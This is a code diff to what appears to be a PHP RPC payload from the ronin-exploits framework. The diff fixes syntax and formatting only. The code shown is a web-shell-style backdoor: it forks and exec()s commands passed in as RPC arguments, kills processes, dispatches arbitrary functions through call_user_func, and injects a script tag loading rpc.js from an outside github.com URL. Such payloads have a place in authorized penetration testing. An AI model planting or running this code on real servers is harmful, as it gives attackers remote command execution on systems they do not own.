@@ -85,7 +85,7 @@ function rpc_sys_spawn($args)
   switch ($pid)
   {
   case -1:
-    return false
+    return false;
   case 0:
     exec(rpc_format_command($args));
   default:
@@ -100,6 +100,7 @@ function rpc_sys_kill($args)
 
   return posix_kill(intval($args[0]),$signal);
 }
+
 function rpc_sys_getcwd($args)  { return rpc_fs_getcwd($args); }
 function rpc_sys_chdir($args)   { return rpc_fs_chdir($args); }
 function rpc_sys_time($args)    { return time(); }
@@ -277,17 +278,11 @@ function rpc_call($request)
   set_error_handler('rpc_error_handler');
   $value = call_user_func($method,$arguments);
 
-  if (isset($rpc_exception))
-  {
-    return Array('exception' => $rpc_exception);
-  }
-  else
-  {
-    return Array('value' => $value);
-  }
+  if (isset($rpc_exception)) { return Array('exception' => $rpc_exception); }
+  else                       { return Array('value' => $value);             }
 }
 
-define('RPC_JS_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc.js')
+define('RPC_JS_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc.js');
 
 echo('<script type="text/javascript" src="' . RPC_JS_URL . '"></script>');
 
